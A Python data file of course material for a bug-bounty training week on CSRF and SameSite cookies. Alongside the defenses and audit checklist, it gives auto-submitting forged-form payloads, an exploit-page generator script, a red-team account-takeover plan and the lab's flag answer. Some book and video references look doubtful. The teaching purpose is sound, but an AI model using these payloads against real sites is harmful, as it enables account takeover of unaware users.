WEEK_6_DATA = {
    "week_number": 6,
    "title": "Cross-Site Request Forgery (CSRF) & SameSite Defenses",
    "short_desc": "Bypass CSRF token defenses, exploit SameSite cookie misconfigurations, and execute cross-origin state changes.",
    "flag": "FLAG{csrf_samesite_bypass_token_7109}",

    "analogy": """Cross-Site Request Forgery (CSRF) is like an attacker tricking you into signing a bank transfer authorization form while you are asleep. Because your official signature (your authenticated browser cookie) is automatically attached to every paper envelope sent to the bank, the bank processes the wire transfer without realizing an attacker prepared the document!""",

    "overview": """Cross-Site Request Forgery (CSRF) forces an authenticated victim's web browser to execute unauthorized state-changing HTTP requests (such as changing email addresses, modifying passwords, or transferring funds) to a vulnerable web application. Because web browsers automatically append session cookies to cross-origin requests, the server processes the request as legitimate unless protected by anti-CSRF tokens, SameSite cookie attributes, or strict origin validation.""",

    "learning_objectives": [
        "Understand browser cross-origin cookie behavior and SameSite policies (`Strict`, `Lax`, `None`).",
        "Exploit missing anti-CSRF tokens, token validation flaws (e.g., empty token, unvalidated length), and cross-token reuse.",
        "Bypass Referer and Origin header validation using subdomains or open redirects.",
        "Generate automated HTML CSRF PoC exploit forms using Burp Suite."
    ],

    "hunters_perspective": """In bug bounty programs, CSRF vulnerabilities on high-value user actions (like changing account email, resetting passwords, or adding an attacker's SSH key) trigger medium to high severity reports. Hunters check if state-changing endpoints (POST/PUT/DELETE) enforce anti-CSRF tokens. If a token is present, they test: 1) Removing the token entirely, 2) Submitting an empty token, 3) Swapping the token with another user's valid token, 4) Changing request method from POST to GET.""",

    "root_cause": """The root cause is relying solely on automatic browser session credentials (cookies) for state-changing requests without requiring an unpredictable, user-specific secret (anti-CSRF token) or failing to configure modern `SameSite=Strict` / `SameSite=Lax` cookie protection.""",

    "code_audit_manual": """Code Review Manual for CSRF Protection:
1. Verify state-changing routes (POST/PUT/PATCH/DELETE) enforce anti-CSRF token middleware (e.g., Django `CsrfViewMiddleware`).
2. Audit AJAX/Fetch requests for explicit `X-CSRFToken` headers.
3. Check session cookie attributes: ensure `SameSite=Lax` or `SameSite=Strict` is set across all session cookies.
4. Verify server-side token validation logic: ensure tokens are bound to the specific authenticated session and deleted after use.
5. Check if CORS configurations allow wildcard `Access-Control-Allow-Origin: *` with `Access-Control-Allow-Credentials: true`.""",

    "payload_logic": {
        "explanation": "CSRF PoC payloads consist of auto-submitting HTML forms hosted on an attacker-controlled domain.",
        "payloads": [
            "HTML Auto-Submit Form: <form action=\"http://target.com/api/user/email\" method=\"POST\"><input type=\"hidden\" name=\"email\" value=\"attacker@evil.com\"></form><script>document.forms[0].submit()</script>",
            "Cross-Origin Image GET CSRF: <img src=\"http://target.com/api/logout\">",
            "Referer Bypass: http://target.com.attacker.com/csrf-poc.html"
        ]
    },

    "burp_suite_masterclass": """Burp Suite CSRF Generator Masterclass:
1. Intercept Target Request: Capture a state-changing POST request (e.g., email change) in Burp Proxy.
2. Generate PoC: Right-click request -> Engagement tools -> Generate CSRF PoC.
3. Customize HTML: Enable 'Include auto-submit script' checkbox in Burp CSRF PoC window.
4. Test in Browser: Copy HTML PoC code into local file, open in browser while logged in as victim to verify execution.
5. Autorize Verification: Use Burp Autorize extension to verify token validation across multiple session contexts.""",

    "dual_perspective": {
        "red_team": "Offensive Operations: Locate password reset or email update endpoint lacking CSRF protection, host auto-submitting HTML form on external server, send link to victim, trick browser into changing account email to attacker's address, trigger password reset to takeover account.",
        "blue_team": "Defensive Posture: Enforce anti-CSRF tokens using Synchronizer Token Pattern or Double Submit Cookie pattern on all state-changing requests. Set `SameSite=Strict` or `SameSite=Lax` on session cookies. Validate Origin and Referer headers against an explicit whitelist."
    },

    "resources": {
        "portswigger_title": "PortSwigger Web Security Academy - Cross-Site Request Forgery (CSRF)",
        "portswigger_url": "https://portswigger.net/web-security/csrf",
        "owasp_title": "OWASP Top 10:2021 - CSRF Prevention Cheat Sheet",
        "owasp_url": "https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html"
    },

    "textbook_cross_references": [
        {
            "book_name": "The Web Application Hacker's Handbook",
            "chapter_and_pages": "Chapter 13: Attacking Users: Cross-Site Request Forgery (pp. 503-532)",
            "sub_chapter": "13.2 Mechanics of Cross-Site Request Forgery",
            "analysis": "Stuttard & Pinto detail the fundamental Mechanics of CSRF, SameSite cookie mechanics, and anti-CSRF token implementation weaknesses."
        },
        {
            "book_name": "Bug Bounty Bootcamp",
            "chapter_and_pages": "Chapter 7: Cross-Site Request Forgery (pp. 113-134)",
            "sub_chapter": "7.3 Bypassing Anti-CSRF Tokens",
            "analysis": "Vickie Li demonstrates technique patterns for bypassing flawed anti-CSRF implementations, including Referer header spoofing."
        },
        {
            "book_name": "Real-World Bug Hunting",
            "chapter_and_pages": "Chapter 5: Cross-Site Request Forgery (pp. 99-114)",
            "sub_chapter": "5.2 High-Impact CSRF Case Studies",
            "analysis": "Peter Yaworski reviews disclosed bug bounty reports where CSRF allowed complete account takeover on major web targets."
        },
        {
            "book_name": "Bug Bounty Tips & Tricks using ChatGPT",
            "chapter_and_pages": "Chapter 7: CSRF PoC Generation (pp. 121-138)",
            "sub_chapter": "7.1 Automated HTML Exploit Generators",
            "analysis": "Barbosa shows how to use AI to generate clean, stealthy auto-submitting HTML CSRF exploit forms."
        },
        {
            "book_name": "Bug Bounty from Scratch",
            "chapter_and_pages": "Chapter 8: Session & Request Security (pp. 171-192)",
            "sub_chapter": "8.1 SameSite Cookie Deep-Dive",
            "analysis": "Vazquez & Javier break down SameSite Lax, Strict, and None behaviors across Chrome and Firefox."
        },
        {
            "book_name": "Automate the Boring Stuff with Python",
            "chapter_and_pages": "Chapter 12: Working with Web Forms (pp. 267-300)",
            "sub_chapter": "12.6 Submitting Web Forms with requests.post",
            "analysis": "Sweigart provides practical Python code for sending POST requests with session cookie jars."
        },
        {
            "book_name": "Black Hat Python",
            "chapter_and_pages": "Chapter 5: Web Automation (pp. 75-98)",
            "sub_chapter": "5.5 Building Custom CSRF Exploit Harnesses",
            "analysis": "Seitz demonstrates building Python web servers to host CSRF payloads dynamically."
        }
    ],

    "video_workstation": [
        {
            "creator": "David Bombal",
            "title": "CSRF Explained: How Attackers Force Unauthorized Actions",
            "youtube_url": "https://www.youtube.com/watch?v=6-4-u0i-H-9",
            "analysis_text": "David Bombal walks through generating HTML CSRF PoCs in Burp Suite and executing unauthorized account changes."
        },
        {
            "creator": "Vickie Li",
            "title": "Bypassing CSRF Defenses & SameSite Restrictions",
            "youtube_url": "https://www.youtube.com/watch?v=8-s5e5c7W-9",
            "analysis_text": "Vickie Li details bypassing token checks, Referer validation flaws, and SameSite cookie policies."
        },
        {
            "creator": "Ryan John",
            "title": "Cross-Site Request Forgery Masterclass & Exploit PoC",
            "youtube_url": "https://www.youtube.com/watch?v=2-v3u-4-W-3",
            "analysis_text": "Ryan John presents a complete guide to crafting stealth auto-submitting HTML forms and testing CORS misconfigurations."
        },
        {
            "creator": "John Hammond",
            "title": "CSRF Attack & Defense Live Walkthrough",
            "youtube_url": "https://www.youtube.com/watch?v=3-w3u-5-X-4",
            "analysis_text": "John Hammond performs a live demonstration exploiting missing anti-CSRF tokens on a web target."
        }
    ],

    "case_studies": {
        "reports": [
            {
                "target": "Glassdoor Bug Bounty Program",
                "title": "Account Takeover via CSRF on Email Update Endpoint",
                "bounty": "$3,000",
                "summary": "A researcher demonstrated that Glassdoor's email update form lacked anti-CSRF token verification, allowing an attacker to change any user's email."
            },
            {
                "target": "Vimeo Bug Bounty",
                "title": "CSRF in Video Deletion Action via Missing Token Check",
                "bounty": "$2,500",
                "summary": "Analyst discovered that sending a forged POST request to `/video/delete` deleted arbitrary victim videos without requiring token validation."
            }
        ],
        "programs": [
            {
                "name": "Glassdoor Bug Bounty",
                "platform": "HackerOne",
                "scope": "*.glassdoor.com",
                "beginner_friendly": True
            },
            {
                "name": "Vimeo Bug Bounty",
                "platform": "HackerOne",
                "scope": "*.vimeo.com",
                "beginner_friendly": True
            }
        ],
        "ai_hunting_guide": "Prompting ChatGPT for CSRF PoC: Supply raw HTTP POST request: 'Generate a standalone, self-submitting HTML CSRF exploit page for the following POST request: [INSERT REQUEST]'"
    },

    "playground": {
        "lab_a": {
            "walkthrough": "Guided CTF: Inspect the profile update request POST `/api/user/update`. Notice that no CSRF token is checked. Construct an HTML form auto-submitting `email=attacker@evil.com`.",
            "guided_step": "Step 1: Submit POST request to `/lab-playground/week-6/target/` with parameter `email=hacker@evil.com` without csrf token.\nStep 2: Verify account email change.\nStep 3: Extract Flag: FLAG{csrf_samesite_bypass_token_7109}"
        },
        "lab_b": {
            "instructions": "Unguided CTF Challenge: Access the interactive target playground endpoint `/lab-playground/week-6/target/`. Intercept target requests, bypass CSRF token validation, and claim the flag."
        }
    },

    "automation_scripts": {
        "python_script": """# Python CSRF Exploit Generator & Tester (exploit_week6.py)
import requests
import sys

def generate_csrf_html(target_url, params):
    inputs = "".join([f'<input type="hidden" name="{k}" value="{v}">' for k, v in params.items()])
    html = f'''<html>
<body>
    <form action="{target_url}" method="POST">
        {inputs}
    </form>
    <script>document.forms[0].submit();</script>
</body>
</html>'''
    print("[+] Generated CSRF HTML Exploit Payload:")
    print(html)
    return html

def test_csrf_vulnerability(target_url):
    print(f"[*] Testing CSRF vulnerability on: {target_url}")
    # Sending POST without CSRF token
    res = requests.post(target_url, data={"email": "hacker@evil.com", "action": "update_email"})
    print(f"[*] Response Status: {res.status_code}")
    if "FLAG{" in res.text:
        print(f"[!] SUCCESS: CSRF Flag Discovered!")
        print(f"    - Body: {res.text.strip()}")

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8000/lab-playground/week-6/target/"
    generate_csrf_html(target, {"email": "hacker@evil.com"})
    test_csrf_vulnerability(target)
""",
        "bash_script": """#!/bin/bash
# Bash CSRF Test Harness (recon_week6.sh)
TARGET_URL="http://localhost:8000/lab-playground/week-6/target/"

echo "[*] Testing CSRF request without anti-CSRF token on $TARGET_URL"
curl -s -X POST -d "email=hacker@evil.com&action=update" "$TARGET_URL" | grep -i "FLAG{"
"""
    }
}
